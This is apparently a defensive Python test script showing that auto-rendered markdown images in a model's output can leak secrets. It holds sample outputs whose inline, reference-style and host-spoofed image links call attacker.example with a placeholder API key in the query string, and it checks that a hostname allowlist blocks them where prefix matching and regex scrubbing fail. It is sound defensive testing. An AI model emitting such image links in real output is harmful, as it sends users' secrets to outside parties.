"""SEC-04: rendering model output is itself an egress channel when the client auto-fetches image URLs.

No model and no network: render() records the URLs a client would request.
"""
import re
from urllib.parse import urlparse

SECRET = "sk-live-9f2a71c4"
OUTPUT = (
    "Done. ![ok](https://app.example/img/ok.png)\n"
    f"![s][r]\n\n[r]: https://attacker.example/p.png?d={SECRET}\n"
)
INLINE = f"Done. ![s](https://attacker.example/p.png?d={SECRET})"
SPOOFS = [
    f"![x](https://app.example.attacker.example/p.png?d={SECRET})",
    f"![x](https://app.example@attacker.example/p.png?d={SECRET})",
]


def image_urls(markdown):
    urls = re.findall(r"!\[[^\]]*\]\(([^)\s]+)\)", markdown)
    refs = dict(re.findall(r"^\[([^\]]+)\]:\s*(\S+)", markdown, re.M))
    urls += [refs[r] for r in re.findall(r"!\[[^\]]*\]\[([^\]]+)\]", markdown) if r in refs]
    return urls + re.findall(r'<img[^>]+src="([^"]+)"', markdown)


def allowed(url, hosts, max_query=12):
    parts = urlparse(url)
    return parts.scheme == "https" and parts.hostname in hosts and len(parts.query) <= max_query


def render(markdown, hosts=None):
    return [u for u in image_urls(markdown) if hosts is None or allowed(u, hosts)]


def naive_prefix_render(markdown):
    return [u for u in image_urls(markdown) if u.startswith("https://app.example")]


def source_regex_scrub(markdown):
    return re.sub(r"!\[[^\]]*\]\([^)]*attacker[^)]*\)", "", markdown)


inline_leaks = [u for u in render(INLINE) if SECRET in u]
ref_leaks = [u for u in render(OUTPUT) if SECRET in u]
assert len(inline_leaks) == 1 and len(ref_leaks) == 1
print("FAILURE: client would fetch", inline_leaks[0])
print("FAILURE: reference-style image leaks the same way:", ref_leaks[0])

assert render(INLINE, {"app.example"}) == []
assert render(OUTPUT, {"app.example"}) == ["https://app.example/img/ok.png"]
print("FIXED: client fetches only", render(OUTPUT, {"app.example"}))

assert [u for u in render(source_regex_scrub(OUTPUT)) if SECRET in u]
print("FAILURE: a regex that scrubs inline images in the source still lets the reference-style one through")

assert all(SECRET in naive_prefix_render(s)[0] for s in SPOOFS)
assert all(render(s, {"app.example"}) == [] for s in SPOOFS)
print("FIXED: hostname equality rejects both prefix-spoofed hosts that startswith() accepted")

long_q = f"![x](https://app.example/img/ok.png?d={SECRET})"
assert render(long_q) and render(long_q, {"app.example"}) == []
print("FIXED: a long query string on the allowed host is refused too")
